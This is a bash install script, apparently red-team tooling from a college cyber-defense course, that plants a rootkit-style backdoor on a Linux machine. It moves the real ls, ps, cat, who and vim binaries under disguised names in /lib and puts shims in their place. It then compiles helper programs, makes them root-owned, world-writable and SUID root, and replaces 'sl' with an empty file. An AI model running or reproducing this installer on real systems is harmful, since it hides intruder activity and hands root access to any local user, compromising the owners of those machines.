#!/bin/bash

# Creator: Simon Buchheit
# Email:   scb5436@rit.edu

# Install packages that may not be present
# Replace 'apt' with the package manager of the target machine
#apt install git vim gcc make automake sl


# Move "healthy" binaries out of /bin
# Note: Some of these paths are OS dependent
# *** Tested on: Xubuntu 18.04
mv /bin/ls /lib/module_ls
mv /bin/ps /lib/module_ps
mv /bin/cat /lib/module_cat
mv /usr/bin/who /lib/module_who
mv /usr/bin/vim /lib/module_vim

# Move my bash shims to replace the old binaries
mv CDT-Tools/ls_shim/ls_new /bin/ls
mv CDT-Tools/ps_shim/ps_new /bin/ps
mv CDT-Tools/cat_shim/cat_new /bin/cat
mv CDT-Tools/who_shim/who_new /usr/bin/who
mv CDT-Tools/vim_shim/vim_new /usr/bin/vim

# Move the binaries to their location
# will be used to leverage the SUID bit and will
# be called by the shims
gcc CDT-Tools/ls_shim/list.c -o CDT-Tools/ls_shim/list
gcc CDT-Tools/ps_shim/pros.c -o CDT-Tools/ps_shim/pros
gcc CDT-Tools/cat_shim/al.c -o CDT-Tools/cat_shim/al
gcc CDT-Tools/who_shim/waldo.c -o CDT-Tools/who_shim/waldo
gcc CDT-Tools/vim_shim/vp.c -o CDT-Tools/vim_shim/vp

mv CDT-Tools/ls_shim/list /bin/list
mv CDT-Tools/ps_shim/pros /bin/pros
mv CDT-Tools/cat_shim/al /bin/al
mv CDT-Tools/who_shim/waldo /bin/waldo
mv CDT-Tools/vim_shim/vp /bin/vp

# Set owner to root
chown root:root /bin/ls
chown root:root /bin/ps
chown root:root /bin/cat
chown root:root /usr/bin/who
chown root:root /usr/bin/vim

chmod 777 /bin/ls
chmod 777 /bin/ps
chmod 777 /bin/cat
chmod 777 /usr/bin/who
chmod 777 /usr/bin/vim

chown root:root /bin/list
chown root:root /bin/pros
chown root:root /bin/al
chown root:root /bin/waldo
chown root:root /bin/vp

chmod 777 /bin/list
chmod 777 /bin/pros
chmod 777 /bin/al
chmod 777 /bin/waldo
chmod 777 /bin/vp

# Set the SUID bit for root so that all commands will always run
chmod u+s /bin/list
chmod u+s /bin/pros
chmod u+s /bin/al
chmod u+s /bin/waldo
chmod u+s /bin/vp

# Install a fake 'sl' command
echo "" > /bin/sl
chmod 777 /bin/sl

# Cleanup the mess
#rm -r CDT-Tools
